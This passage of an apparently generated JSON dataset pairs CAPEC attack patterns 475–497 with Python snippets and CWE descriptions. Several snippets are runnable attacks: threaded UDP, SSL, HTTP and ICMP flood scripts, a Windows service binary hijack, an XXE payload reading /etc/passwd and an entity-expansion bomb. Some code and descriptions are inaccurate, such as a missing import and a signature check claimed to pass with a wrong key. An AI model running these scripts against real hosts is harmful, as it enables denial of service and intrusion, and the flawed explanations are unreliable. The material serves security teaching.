        "code_snippet": "import os\nimport hashlib\nimport hmac\n\n# Simulate storing a private key insecurely\nprivate_key_path = 'private_key.pem'\n\n# Insecurely storing the private key\nwith open(private_key_path, 'w') as key_file:\n    key_file.write('-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----')\n\n# Function to sign a message\ndef sign_message(message, key_path):\n    with open(key_path, 'r') as key_file:\n        private_key = key_file.read()\n    signature = hmac.new(private_key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return signature\n\n# Simulate an attacker stealing the private key\nstolen_key_path = 'stolen_private_key.pem'\nos.system(f'cp {private_key_path} {stolen_key_path}')\n\n# Attacker forges a signature using the stolen key\nmessage = 'Important transaction'\nforged_signature = sign_message(message, stolen_key_path)\n\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a scenario where a private key is stored insecurely, making it susceptible to theft. The private key is written to a file in an insecure manner, and an attacker can easily copy this key. The attacker then uses the stolen key to forge a signature for a message, misleading the victim into believing the message is from a trusted source. This embodies the CAPEC 'Signature Spoofing by Key Theft' and highlights CWE-522 (Insufficiently Protected Credentials) by showing how insecure storage of credentials can lead to unauthorized access and actions."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulate a broken cryptographic algorithm\n# Using MD5 which is considered broken and risky (CWE-327)\ndef generate_signature(key, message):\n    return hmac.new(key.encode(), message.encode(), hashlib.md5).hexdigest()\n\n# Simulate improper verification of cryptographic signature (CWE-347)\ndef verify_signature(key, message, signature):\n    expected_signature = generate_signature(key, message)\n    return expected_signature == signature\n\n# Simulate an adversary generating a valid signature without knowing the key\n# This is possible due to the use of a broken algorithm and improper verification\nadversary_key = 'wrong_key'\nmessage = 'important_message'\n\n# Adversary generates a signature with a wrong key\nadversary_signature = generate_signature(adversary_key, message)\n\n# Verification process (improperly implemented)\nif verify_signature('correct_key', message, adversary_signature):\n    print('Signature is valid (but it should not be)')\nelse:\n    print('Signature is invalid')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can generate a valid signature without knowing the correct key, exploiting weaknesses in the cryptographic algorithm and signature verification process. The `generate_signature` function uses the MD5 hashing algorithm, which is considered broken and risky (CWE-327). The `verify_signature` function improperly verifies the cryptographic signature (CWE-347). An adversary generates a signature using a wrong key, but due to the broken algorithm and improper verification, the system incorrectly validates the signature as valid. This embodies the main idea of CAPEC 'Signature Spoofing by Improper Validation'."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import hashlib\nimport hmac\n\n# Simulated function to verify a signature\n# CWE-347: Improper Verification of Cryptographic Signature\ndef verify_signature(message, signature, key):\n    expected_signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).hexdigest()\n    return expected_signature == signature\n\n# Simulated function to authenticate a user\n# CWE-290: Authentication Bypass by Spoofing\ndef authenticate_user(user_id, signature, key):\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    # CWE-300: Channel Accessible by Non-Endpoint\n    if verify_signature(user_id, signature, key):\n        print(f\"User {user_id} authenticated successfully.\")\n    else:\n        print(\"Authentication failed.\")\n\n# Example usage\nuser_id = \"user123\"\nkey = \"secret_key\"\n# Attacker generates a spoofed signature\nspoofed_signature = \"fake_signature\"\n\n# Attempt to authenticate with a spoofed signature\nauthenticate_user(user_id, spoofed_signature, key)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Signature Spoofing by Misrepresentation'. The `verify_signature` function is intended to verify the cryptographic signature of a message, but it is vulnerable to spoofing attacks (CWE-347). The `authenticate_user` function uses this verification to authenticate a user based on their user ID and signature. However, it does not correctly enforce message integrity (CWE-924) or verify the identity of the communication channel endpoints (CWE-300), making it susceptible to authentication bypass by spoofing (CWE-290). An attacker can exploit these weaknesses by providing a spoofed signature, leading to unauthorized access."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import hashlib\n\nclass DataPacket:\n    def __init__(self, data, signature=None):\n        self.data = data\n        self.signature = signature\n\n    def is_signed(self):\n        return self.signature is not None\n\n    def verify_signature(self, public_key):\n        if not self.is_signed():\n            return False\n        # Simplified signature verification\n        return public_key.verify(self.signature, self.data)\n\n# Simulated public key for verification\nclass PublicKey:\n    def verify(self, signature, data):\n        # Simplified verification logic\n        return hashlib.sha256(data.encode()).hexdigest() == signature\n\n# Example usage\npublic_key = PublicKey()\n\n# Unsigned data packet\nunsigned_packet = DataPacket('sensitive_data')\n\n# Signed data packet\nsigned_packet = DataPacket('sensitive_data', hashlib.sha256('sensitive_data'.encode()).hexdigest())\n\n# Process packets\npackets = [unsigned_packet, signed_packet]\nfor packet in packets:\n    if packet.is_signed() and packet.verify_signature(public_key):\n        print('Processing signed data:', packet.data)\n    else:\n        print('Processing unsigned data:', packet.data)",
        "description": "This Python code snippet demonstrates a scenario where both signed and unsigned data packets are processed. The `DataPacket` class represents a data packet that may or may not be signed. The `verify_signature` method checks if the packet is signed and verifies the signature using a simplified public key verification process. The main idea of the CAPEC is embodied in the processing loop, where both signed and unsigned packets are processed without sufficient distinction, potentially leading to unsigned data being treated as signed data. This represents a 'Signature Spoofing by Mixing Signed and Unsigned Content' vulnerability. The related CWEs are illustrated through the lack of proper signature verification (CWE-347), the potential for protection mechanism failure (CWE-693), and the general handling of sensitive data without encryption (CWE-311, CWE-319)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32serviceutil\nimport win32service\nimport win32api\nimport win32con\n\n# CWE-284: Improper Access Control\n# CWE-15: External Control of System or Configuration Setting\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Function to modify a Windows service configuration\n# This code assumes the user has the necessary permissions to modify the service\n\ndef modify_service(service_name, binary_path):\n    try:\n        # Open the service manager\n        scm_handle = win32service.OpenSCManager(None, None, win32con.SC_MANAGER_ALL_ACCESS)\n        if scm_handle == 0:\n            raise Exception('Failed to open service manager')\n\n        # Open the service\n        service_handle = win32service.OpenService(scm_handle, service_name, win32service.SERVICE_ALL_ACCESS)\n        if service_handle == 0:\n            raise Exception('Failed to open service')\n\n        # Change the service configuration to point to a new binary\n        win32service.ChangeServiceConfig(\n            service_handle,\n            win32service.SERVICE_NO_CHANGE,\n            win32service.SERVICE_NO_CHANGE,\n            win32service.SERVICE_NO_CHANGE,\n            binary_path,\n            None,\n            0,\n            None,\n            None,\n            None,\n            None\n        )\n\n        # Close the service and service manager handles\n        win32service.CloseServiceHandle(service_handle)\n        win32service.CloseServiceHandle(scm_handle)\n\n        print(f'Service {service_name} modified to use binary {binary_path}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nmodify_service('SomeService', 'C:\\path\\to\\malicious_binary.exe')",
        "description": "This Python code snippet demonstrates how an adversary could exploit improper access control (CWE-284) and external control of system or configuration settings (CWE-15) to modify the execution parameters of a Windows service. The code uses the `pywin32` library to interact with the Windows Service Control Manager (SCM) and change the binary path of a specified service to a potentially malicious executable. This represents the main idea of the CAPEC 'Modification of Windows Service Configuration', where an attacker aims to execute a malicious binary in place of an existing service. The code assumes the user has the necessary permissions to modify the service, highlighting the risk of improper access control."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context without proper certificate validation\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)\ncontext.check_hostname = False  # CWE-297: Improper Validation of Certificate with Host Mismatch\ncontext.verify_mode = ssl.CERT_NONE  # CWE-295: Improper Certificate Validation\n\n# Connect to a server with the malicious root certificate\nhostname = 'malicious.example.com'\nconn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)\nconn.connect((hostname, 443))\n\n# Send a request to the server\nconn.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + hostname.encode() + b'\\r\\n\\r\\n')\n\n# Receive the response\nresponse = conn.recv(4096)\nprint(response.decode())\n\nconn.close()",
        "description": "This Python code snippet demonstrates a scenario where an SSL/TLS connection is established without proper certificate validation, embodying the main idea of the CAPEC 'Malicious Root Certificate'. The code creates an SSL context that does not verify the server's certificate (CWE-295) and does not check the hostname against the certificate (CWE-297). This allows an adversary to install a malicious root certificate and intercept or spoof HTTPS connections without triggering security warnings. The code connects to a server with a potentially malicious certificate, sends an HTTP request, and prints the response, illustrating how improper certificate validation can be exploited."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-653: Improper Isolation or Compartmentalization\n# This function runs a command in a virtualized environment (e.g., Docker container)\ndef run_in_virtual_env(command):\n    # Simulate running in a virtualized environment\n    print(f\"Running in virtual environment: {command}\")\n    # CWE-114: Process Control - Executing a command from an untrusted source\n    subprocess.run(command, shell=True)\n\n# CWE-693: Protection Mechanism Failure\n# Simulate a failure in the protection mechanism that allows escaping the virtual environment\n# CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n# CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution\n# This function simulates escaping the virtual environment and accessing the host system\n\ndef escape_virtual_env():\n    print(\"Escaping virtual environment...\")\n    # Accessing sensitive information on the host system\n    sensitive_data = os.getenv('HOST_SECRET')\n    print(f\"Accessed sensitive data: {sensitive_data}\")\n\n# Simulate running a command in a virtualized environment\nrun_in_virtual_env('ls')\n\n# Simulate escaping the virtual environment\nescape_virtual_env()",
        "description": "This Python code snippet demonstrates the concept of 'Escaping Virtualization' (CAPEC) by simulating a scenario where an attacker runs a command within a virtualized environment and then escapes to access sensitive information on the host system. The `run_in_virtual_env` function represents running a command in a virtualized environment, while the `escape_virtual_env` function simulates the escape and access to sensitive data on the host system. The code incorporates CWE-653 (Improper Isolation or Compartmentalization) by not properly isolating the virtual environment, CWE-114 (Process Control) by executing commands from an untrusted source, and CWE-693 (Protection Mechanism Failure) by simulating a failure in the protection mechanism. Additionally, it touches on CWE-1421 and CWE-1423 by implying the exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import requests\nimport ssl\n\n# Create a custom SSL context to leave the SNI field blank (Domainless Fronting)\ncontext = ssl.create_default_context()\ncontext.check_hostname = False\ncontext.verify_mode = ssl.CERT_NONE\n\n# URL with a different domain in the Host header (Domain Fronting)\nurl = 'https://example.com/resource'\nheaders = {\n    'Host': 'malicious.com'\n}\n\n# Send the request\nresponse = requests.get(url, headers=headers, verify=False)\n\nprint(response.status_code)\nprint(response.text)",
        "description": "This Python code snippet demonstrates the concept of 'Contradictory Destinations in Traffic Routing Schemes' by using Domain Fronting and Domainless Fronting techniques. The code sets up an HTTPS request where the SNI field is left blank (Domainless Fronting) and the Host header specifies a different domain (Domain Fronting). This can potentially route traffic to an unintended destination, exploiting weaknesses such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel). The code uses the 'requests' library to send the HTTP request and prints the response status and content."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server code that does not limit resource allocation\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    # No limit on the number of connections or resources allocated\n    client_socket.send(bytes('Welcome to the server!', 'utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a simple TCP server that is vulnerable to a TCP Flood attack. The server listens for incoming connections on port 8080 and accepts them without any limit on the number of connections or resources allocated (CWE-770). This lack of resource allocation control can be exploited by an adversary to perform a TCP Flood attack, overwhelming the server and denying legitimate users access to the service. The code does not implement any throttling or resource management, making it susceptible to denial-of-service attacks."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Untrusted XML input\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(root.text)\n    except ET.ParseError as e:\n        print(f\"XML parsing error: {e}\")\n\n# Parse the untrusted XML data\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611: Improper Restriction of XML External Entity Reference. The code accepts an untrusted XML input containing an external entity reference that attempts to access the '/etc/passwd' file. The `parse_xml` function uses the `xml.etree.ElementTree` module to parse the XML data without proper validation or restriction of external entities. This can lead to an XML External Entity (XXE) attack, where an attacker can read sensitive files or cause a denial of service. The code highlights the importance of validating and securely processing XML data to prevent such vulnerabilities."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport hashlib\n\n# Simulate a weak random number generator\nclass WeakPRNG:\n    def __init__(self, seed):\n        self.seed = seed\n\n    def get_random_number(self):\n        random.seed(self.seed)\n        return random.randint(0, 1000000)\n\n# Simulate the generation of a private key using a weak PRNG\nseed = 12345\nprng = WeakPRNG(seed)\nprivate_key = prng.get_random_number()\n\n# Simulate the signing process\nmessage = 'Important transaction'\nmessage_hash = hashlib.sha256(message.encode()).hexdigest()\nsignature = hashlib.sha256((message_hash + str(private_key)).encode()).hexdigest()\n\n# Attacker can recreate the private key due to weak PRNG\nattacker_prng = WeakPRNG(seed)\nattacker_private_key = attacker_prng.get_random_number()\n\n# Attacker forges a signature\nforged_message = 'Transfer $1000 to attacker'\nforged_message_hash = hashlib.sha256(forged_message.encode()).hexdigest()\nforged_signature = hashlib.sha256((forged_message_hash + str(attacker_private_key)).encode()).hexdigest()\n\nprint(f'Original Signature: {signature}')\nprint(f'Forged Signature: {forged_signature}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can recreate a private signature key due to the use of a weak pseudorandom number generator (PRNG). The `WeakPRNG` class simulates a PRNG with a predictable seed. The private key is generated using this weak PRNG, and a message is signed with this key. An attacker, knowing the seed, can recreate the same private key and forge a signature for a different message. This embodies the CAPEC of 'Signature Spoofing by Key Recreation' and highlights the CWE of 'Use of Predictable Algorithm in Random Number Generator' and 'Use of Insufficiently Random Values'."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\nimport threading\n\n# Function to perform UDP flood attack\ndef udp_flood(target_ip, target_port, duration):\n    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    bytes_to_send = random._urandom(1024)  # CWE-770: No limit on resource allocation\n    timeout = time.time() + duration\n    while time.time() < timeout:\n        client.sendto(bytes_to_send, (target_ip, target_port))  # CWE-941: Incorrectly specified destination\n\n# Target details\nTARGET_IP = '192.168.1.1'\nTARGET_PORT = 80\nDURATION = 60  # Duration of the attack in seconds\n\n# Start the attack\nthread = threading.Thread(target=udp_flood, args=(TARGET_IP, TARGET_PORT, DURATION))\nthread.start()",
        "description": "This Python code snippet demonstrates a basic UDP flood attack, which is a type of denial-of-service (DoS) attack. The code creates a UDP socket and sends a large number of UDP packets to a specified target IP and port for a given duration. The `random._urandom(1024)` function generates random bytes to send, representing CWE-770 (Allocation of Resources Without Limits or Throttling). The target IP and port are specified, but in a real attack, this could be incorrect or spoofed, representing CWE-941 (Incorrectly Specified Destination in a Communication Channel). The code does not include any checks or controls on the volume of traffic sent, which can overwhelm the target's network resources, aligning with the main idea of the CAPEC (UDP Flood)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\n\n# Vulnerable server that does not limit ICMP requests\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\nserver_socket.bind(('0.0.0.0', 0))\n\nprint('Server is running and waiting for ICMP packets...')\n\ntry:\n    while True:\n        data, addr = server_socket.recvfrom(1024)\n        print(f'Received packet from {addr}')\nexcept KeyboardInterrupt:\n    print('Server shutting down.')\nfinally:\n    server_socket.close()",
        "description": "This Python code snippet represents a simple server that listens for ICMP packets without any rate limiting or resource allocation restrictions. The server uses raw sockets to receive ICMP packets and prints the source address of each packet. This setup is vulnerable to an ICMP flood attack (CAPEC-ICMP Flood) because it does not impose any limits on the number of ICMP packets it can handle, leading to potential resource exhaustion (CWE-770). Additionally, the server does not verify the source of the packets, making it susceptible to spoofed packets (CWE-923)."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport threading\nimport time\n\napp = Flask(__name__)\n\n# Simulate resource allocation without limits\nactive_sessions = []\n\n@app.route('/resource', methods=['GET'])\ndef allocate_resource():\n    session_id = request.args.get('session_id')\n    if session_id:\n        # Allocate resource without any limit or throttling\n        active_sessions.append(session_id)\n        # Simulate resource consumption\n        time.sleep(5)\n        return f'Resource allocated for session {session_id}', 200\n    return 'Invalid session', 400\n\nif __name__ == '__main__':\n    # Start the Flask app\n    threading.Thread(target=app.run, kwargs={'port': 5000}).start()\n\n    # Simulate HTTP Flood attack\n    def flood_attack():\n        import requests\n        while True:\n            requests.get('http://127.0.0.1:5000/resource', params={'session_id': 'attacker'})\n\n    # Start multiple threads to simulate the attack\n    for _ in range(100):\n        threading.Thread(target=flood_attack).start()",
        "description": "This Python code snippet uses the Flask web framework to create a simple web service that allocates resources based on HTTP GET requests. The '/resource' endpoint simulates resource allocation without any limits or throttling, embodying CWE-770 (Allocation of Resources Without Limits or Throttling). The code also includes a simulated HTTP Flood attack, where multiple threads continuously send GET requests to the '/resource' endpoint, consuming server resources and potentially leading to a denial of service. This demonstrates the main idea of the CAPEC (HTTP Flood) by showing how an attacker can exploit the lack of resource limits to overwhelm the server. The code also indirectly touches on CWE-410 (Insufficient Resource Pool) by not handling peak demand properly."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import ssl\nimport socket\nimport threading\n\n# Function to create SSL connections and keep renegotiating\ndef ssl_flood(target_host, target_port):\n    context = ssl.create_default_context()\n    while True:\n        try:\n            with socket.create_connection((target_host, target_port)) as sock:\n                with context.wrap_socket(sock, server_hostname=target_host) as ssock:\n                    # Renegotiate SSL connection\n                    ssock.do_handshake()\n        except Exception as e:\n            pass\n\n# Target server details\ntarget_host = 'example.com'\ntarget_port = 443\n\n# Launch multiple threads to simulate a flood attack\nthreads = []\nfor _ in range(100):  # Adjust the number of threads as needed\n    thread = threading.Thread(target=ssl_flood, args=(target_host, target_port))\n    thread.start()\n    threads.append(thread)\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates an SSL flood attack, where multiple threads are used to create SSL connections to a target server and continuously renegotiate the SSL handshake. This type of attack exploits the asymmetric resource consumption between the client and server during the SSL handshake process, leading to resource exhaustion on the server side. The code embodies the main idea of the CAPEC by simulating a denial-of-service attack using SSL renegotiation, and it highlights related CWEs such as uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770)."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\n\n# Vulnerable UDP server that can be exploited for amplification attacks\ndef udp_server(host='0.0.0.0', port=12345):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind((host, port))\n    print(f'Listening on {host}:{port}')\n\n    while True:\n        data, addr = sock.recvfrom(1024)  # Receive request\n        print(f'Received {len(data)} bytes from {addr}')\n\n        # Vulnerable amplification: respond with a much larger payload\n        response = b'A' * 4096  # Amplified response\n        sock.sendto(response, addr)\n        print(f'Sent {len(response)} bytes to {addr}')\n\nif __name__ == '__main__':\n    udp_server()",
        "description": "This Python code snippet demonstrates a vulnerable UDP server that can be exploited for amplification attacks. The server listens for incoming UDP packets and responds with a much larger payload than the received request. This embodies the main idea of the CAPEC 'Amplification' attack, where an adversary can send small requests to a server and cause it to generate large responses, potentially overwhelming the target server. The code also reflects related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-405 (Asymmetric Resource Consumption), by not imposing any restrictions on the size of the response and allowing an adversary to cause the server to consume excessive resources."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a large entity\nlarge_entity = '<!ENTITY large \"' + 'A' * 1000000 + '\">\n'\n\n# Define an XML with multiple references to the large entity\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY large \"''' + 'A' * 1000000 + '''\">\n<!ELEMENT root ANY>\n<!ELEMENT item ANY>\n<!ENTITY ref1 \"&large;&large;&large;&large;&large;&large;&large;&large;&large;&large;\">\n<!ENTITY ref2 \"&ref1;&ref1;&ref1;&ref1;&ref1;&ref1;&ref1;&ref1;&ref1;&ref1;\">\n<!ENTITY ref3 \"&ref2;&ref2;&ref2;&ref2;&ref2;&ref2;&ref2;&ref2;&ref2;&ref2;\">\n]>\n<root>\n<item>&ref3;</item>\n</root>\n'''\n\ntry:\n    # Parse the XML data\n    root = ET.fromstring(xml_data)\n    print(ET.tostring(root))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\nexcept MemoryError as e:\n    print(f\"Memory error: {e}\")",
        "description": "This Python code snippet demonstrates a Quadratic Data Expansion attack using XML entity expansion. The code defines a large entity and then creates an XML document that references this entity multiple times, leading to excessive memory allocation. The `xml.etree.ElementTree` library is used to parse the XML data, which can cause a denial of service due to the excessive memory required to expand the entities. This example embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by not imposing limits on the size or number of resources allocated. The code also touches on CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements) by using a large number of sub-elements in the XML structure."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\n\ndef vulnerable_regex(input_string):\n    # CWE-1333: Inefficient Regular Expression Complexity\n    # CWE-777: Regular Expression without Anchors\n    pattern = re.compile(r'(a+)+$')\n    if pattern.match(input_string):\n        return 'Match found'\n    else:\n        return 'No match'\n\n# Example of input that causes exponential blowup\ninput_string = 'a' * 30 + '!'  # This input will cause the regex to backtrack excessively\nprint(vulnerable_regex(input_string))",
        "description": "This Python code snippet demonstrates a vulnerable regular expression that can lead to exponential blowup, as described in the CAPEC. The regular expression pattern '(a+)+$' is inefficient and can cause excessive backtracking, leading to high CPU consumption (CWE-1333). Additionally, the regex is not properly anchored (CWE-777), which can allow for potential bypasses. The input string 'a' * 30 + '!' is designed to trigger this inefficiency, causing the regex engine to perform poorly and consume excessive resources."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable SOAP message handler\nclass SOAPService:\n    def handle_request(self, soap_message):\n        try:\n            root = ET.fromstring(soap_message)\n            array_elements = root.findall('.//arrayElement')\n            array_size = int(root.find('.//arraySize').text)\n            \n            # Allocate memory for the array without limits\n            array = [None] * array_size\n            for i, elem in enumerate(array_elements):\n                array[i] = elem.text\n            \n            return \"Array processed successfully\"\n        except Exception as e:\n            return f\"Error processing SOAP message: {str(e)}\"\n\n# Example SOAP message with a large array declaration\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n    <soap:Body>\n        <arraySize>1000000</arraySize>\n        <arrayElement>1</arrayElement>\n        <arrayElement>2</arrayElement>\n    </soap:Body>\n</soap:Envelope>\n'''\n\nservice = SOAPService()\nresponse = service.handle_request(soap_message)\nprint(response)",
        "description": "This Python code snippet demonstrates a vulnerable SOAP service that processes SOAP messages containing array declarations. The SOAPService class has a handle_request method that parses the SOAP message, extracts the array size, and allocates memory for the array without any limits or throttling. This can lead to memory exhaustion if an attacker sends a SOAP message with a very large array size, as described in the CAPEC 'SOAP Array Blowup'. The code also touches on related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by not imposing any restrictions on the size of the allocated array."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a fragmented TCP packet\n# Fragment 1: TCP header without flags\nfragment1 = b'\\x45\\x00\\x00\\x1c\\x1c\\x46\\x40\\x00\\x40\\x06\\xb1\\xe6\\xc0\\xa8\\x00\\x68\\xc0\\xa8\\x00\\x01'  # IP header\nfragment1 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP header without flags\n\n# Fragment 2: TCP flags\nfragment2 = b'\\x45\\x00\\x00\\x14\\x1c\\x47\\x20\\x00\\x40\\x06\\xb1\\xe5\\xc0\\xa8\\x00\\x68\\xc0\\xa8\\x00\\x01'  # IP header\nfragment2 += b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x20\\x00\\x72\\x10\\x00\\x00'  # TCP flags\n\n# Send the fragments\ns.sendto(fragment1, ('192.168.0.1', 0))\ns.sendto(fragment2, ('192.168.0.1', 0))\n\n# Close the socket\ns.close()",
        "description": "This Python code snippet demonstrates a TCP Fragmentation attack. It creates a raw socket and constructs two TCP packet fragments. The first fragment contains the TCP header without the flags, and the second fragment contains the TCP flags. By sending these fragments separately, the attacker aims to bypass network filtering rules that may not inspect the second fragment. This code embodies the main idea of the CAPEC by showing how an adversary can exploit TCP fragmentation to avoid detection. The related CWEs provide additional context, such as the lack of resource limits (CWE-770) and improper resource shutdown (CWE-404), which can exacerbate the impact of such attacks."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import socket\n\n# Create a large UDP packet to force fragmentation\nlarge_message = b'A' * 2000  # 2000 bytes, larger than typical MTU of 1500 bytes\n\n# Create a UDP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# Target server address\nserver_address = ('localhost', 9999)\n\ntry:\n    # Send the large UDP packet to the server\n    sock.sendto(large_message, server_address)\n    print('Large UDP packet sent to force fragmentation')\nfinally:\n    # Ensure the socket is closed properly\n    sock.close()",
        "description": "This Python code snippet demonstrates a UDP fragmentation attack by sending a large UDP packet (2000 bytes) to a target server, which forces IP fragmentation as the packet size exceeds the typical MTU of 1500 bytes. The code creates a UDP socket, constructs a large message, and sends it to the specified server address. This can lead to resource exhaustion on the server, such as high CPU usage and memory buffer consumption, as it processes and reassembles the fragmented packets. The code also ensures proper resource shutdown by closing the socket after the operation. This example embodies the main idea of the CAPEC by illustrating how an attacker can exploit resource allocation without limits (CWE-770) and insufficient control of network message volume (CWE-406)."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\nimport threading\n\n# Function to send fragmented ICMP packets\ndef send_fragmented_icmp(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    packet = b'\\x08\\x00' + b'\\x00' * 46  # ICMP Echo Request with padding\n    fragment_size = 8  # Small fragment size to simulate fragmentation\n    fragments = [packet[i:i+fragment_size] for i in range(0, len(packet), fragment_size)]\n    while True:\n        for fragment in fragments:\n            sock.sendto(fragment, (target_ip, 0))\n\n# Function to start multiple threads to simulate resource exhaustion\ndef start_attack(target_ip, thread_count=10):\n    threads = []\n    for _ in range(thread_count):\n        thread = threading.Thread(target=send_fragmented_icmp, args=(target_ip,))\n        thread.start()\n        threads.append(thread)\n    for thread in threads:\n        thread.join()\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'  # Replace with the target IP address\n    start_attack(target_ip)",
        "description": "This Python code snippet demonstrates an ICMP Fragmentation attack, where an attacker sends a large number of fragmented ICMP packets to a target host. The `send_fragmented_icmp` function creates a raw socket and sends small fragments of an ICMP Echo Request packet in a loop. The `start_attack` function initiates multiple threads to simulate resource exhaustion on the target host. This attack can lead to resource consumption or a crash on the target system. The code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) by continuously sending packets without any restriction, potentially leading to resource exhaustion. It also touches on CWE-404 (Improper Resource Shutdown or Release) as the resources (sockets) are not properly managed or released."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import os\n\n# Vulnerable function to discover sensitive files\n\ndef discover_files(directory):\n    try:\n        for root, dirs, files in os.walk(directory):\n            for file in files:\n                if file in ['config.txt', 'secrets.txt', 'access_control_list.txt']:\n                    with open(os.path.join(root, file), 'r') as f:\n                        print(f.read())\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nuser_input_directory = input('Enter the directory to search: ')\ndiscover_files(user_input_directory)",
